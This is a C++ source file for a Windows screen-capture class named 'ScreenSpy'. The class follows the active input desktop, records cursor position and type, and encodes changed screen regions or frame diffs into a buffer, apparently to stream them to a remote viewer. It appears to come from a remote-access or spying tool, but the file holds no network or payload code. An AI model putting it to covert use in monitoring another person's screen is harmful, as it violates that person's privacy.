// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "ScreenSpy.h"
#include "until.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	19
#define OFF_SET		24
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}

	m_dwBitBltRop	= SRCCOPY;

	m_bAlgorithm	= ALGORITHM_SCAN; // 默認使用隔行掃描算法
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;
    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nIncSize		= 32 / m_biBitCount;

	m_nStartLine	= 0;

	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;

	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);
	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
	
	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// 足夠了
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

	m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hDiffMemDC);

	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);
	::DeleteObject(m_hDiffBitmap);

	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	static LONG	nOldCursorPosY = 0;
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;

	SelectInputWinStation();

	// 重置rect緩衝區指針
	m_rectBufferOffset = 0;

	// 寫入使用了哪種算法
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// 寫入光標位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// 寫入當前光標類型
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// 差異比較算法
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// 分段掃描全屏幕
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		return m_rectBuffer;
	}

	// 鼠標位置發變化並且熱點區域如果發生變化，以(發生變化的行 + DEF_STEP)向下掃描
	// 向上提
	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
	for (
		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
		i < m_nFullHeight; 
		i += DEF_STEP
		)
	{
		if (ScanChangedRect(i))
		{
			i += DEF_STEP;
		}
	}
	nOldCursorPosY = CursorPos.y;

	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
	*lpdwBytes = m_rectBufferOffset;

	// 限制發送幀的速度
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(1);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

	return m_rectBuffer;
}



bool CScreenSpy::ScanChangedRect(int nStartLine)
{
	bool	bRet = false;
	LPDWORD p1, p2;
	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	// 0 是最後一行
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
	p2 = (PDWORD)m_lpvLineBits;
	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
	{
		if (*p1 != *p2)
		{
			if (m_changeRect.right < 0)
				m_changeRect.left = j - OFF_SET;
			m_changeRect.right = j + OFF_SET;
		}
		p1++;
		p2++;
	}
	
	if (m_changeRect.right > -1)
	{
		m_changeRect.left   = max(m_changeRect.left, 0);
		m_changeRect.top    = max(m_changeRect.top, 0);
		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
		// 複製改變的區域
		CopyRect(&m_changeRect);
		bRet = true;
	}

	return bRet;
}
void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount 為1 (黑白二色圖) 、4 (16 色圖) 、8 (256 色圖) 時由顏色表項數指出顏色表大小
biBitCount 為16 (16 位色圖) 、24 (真彩色圖, 不支持) 、32 (32 位色圖) 時沒有顏色表
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16位和以後的沒有顏色表，直接返回
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95和Windows 98：如果lpvBits參數為NULL並且GetDIBits成功地填充了BITMAPINFO結構，那麼返回值為位圖中總共的掃描線數。
	
    Windows NT：如果lpvBits參數為NULL並且GetDIBits成功地填充了BITMAPINFO結構，那麼返回值為非0。如果函數執行失敗，那麼將返回0值。Windows NT：若想獲得更多錯誤信息，請調用callGetLastError函數。
	*/

	HDC	hDC = GetDC(NULL);
	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // 高寬不能為0
	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}

void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}

LPVOID CScreenSpy::getFirstScreen()
{
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// 調整m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
		* m_lpbmi_rect->bmiHeader.biHeight;


	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
	::SelectObject(m_hRectMemDC, hRectBitmap);
	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

	DeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}
//// 當前輸入的熱點
// LONG CScreenSpy::getKeyBoardHotspotY()
// {
// 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
// 	static	HWND	hWindow = GetForegroundWindow();
// 	static	DWORD	dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 	HWND	hCurrentWindow = GetForegroundWindow();
// 	if (hCurrentWindow != hWindow )
// 	{
// 		// Release
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, FALSE);
// 		hWindow = hCurrentWindow;
// 		dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, TRUE);
// 	}
// 	
// 	POINT	pt;
// 	if (GetCaretPos(&pt))
// 	{
// 		ClientToScreen(GetFocus(), &pt);
// 	}
// 	return pt.y;	
// }

void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // 掃描間隔
	// 掃描屏幕
	for (int i = 0,nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;
		BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
		Sleep(nJumpSleep);
	}
}

// 差異比較算法塊的函數
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows規定一個掃描行所占的字節數必須是4的倍數, 所以用DWORD比較
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;

	// 偏移的偏移，不同長度的偏移
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // 數據計數器
	// p1++實際上是遞增了一個DWORD
	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// 一個新數據塊開始
		// 寫入偏移地址
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// 記錄數據大小的存放位置
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // 數據計數器歸零

		// 更新Dest中的數據
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;

		nCount += 4;
		i += 4, p1++, p2++;
		
		for (int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// 更新Dest中的數據
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// 寫入數據長度
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}

	// nOffsetOffset 就是寫入的總大小
	return nOffsetOffset;

//	感覺匯編速度還沒有C算法快，鬱悶來著
// 	int	Bytes = 0;
// 	__asm
// 	{
// 		mov     esi, [lpSource]
// 		mov     edi, [lpDest]
// 		mov     ebx, [lpBuffer]
// 		xor		ecx, ecx
// 		jmp		short Loop_Compare				// 開始進行比較
// Loop_Compare_Continue:
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		je      short Loop_Compare_Equal		// 如果相等, 繼續比較
// 		mov		[edi], eax						// 寫入不同的數據到目標中
// 		mov     edx, ebx						// edx 記錄第一個不同區域塊的起始位置
// 		mov     dword ptr [ebx], ecx
// 		add     ebx, 8
// 		mov     dword ptr [ebx], eax
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare		// 數據不同，產生一個區塊，對這個區塊進行比較
// Loop_Block_Compare_Continue:	
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		jnz     short Loop_Block_Compare_Not_Equal // 數據不相等，寫入
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare_Finish
// Loop_Block_Compare_Not_Equal:	
// 		mov     dword ptr [ebx], eax
// 		mov		[edi], eax					// 寫入不同的數據到目標中
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Block_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Block_Compare_Continue
// Loop_Block_Compare_Finish:
// 		cmp     ecx, [dwSize]
// 		jnz     short Loop_Compare
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		jmp     short Loop_Compare
// Loop_Compare_Equal:
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Compare_Continue
// 	}
// 	return Bytes;	
}
